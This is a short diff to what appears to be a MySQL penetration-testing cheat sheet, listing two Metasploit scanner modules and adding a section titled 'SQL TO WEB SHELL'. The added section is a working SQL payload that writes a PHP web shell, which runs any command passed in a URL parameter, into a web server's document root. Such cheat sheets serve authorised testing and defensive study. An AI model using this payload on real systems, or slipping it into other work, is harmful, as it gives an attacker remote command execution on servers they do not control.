@@ -44,3 +44,8 @@ auxiliary/scanner/mysql/mysql_writable_dirs
 ```
 auxiliary/scanner/mysql/mysql_file_enum
 ```
+
+### SQL TO WEB SHELL
+```SQL
+SELECT '<?php echo passthru($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
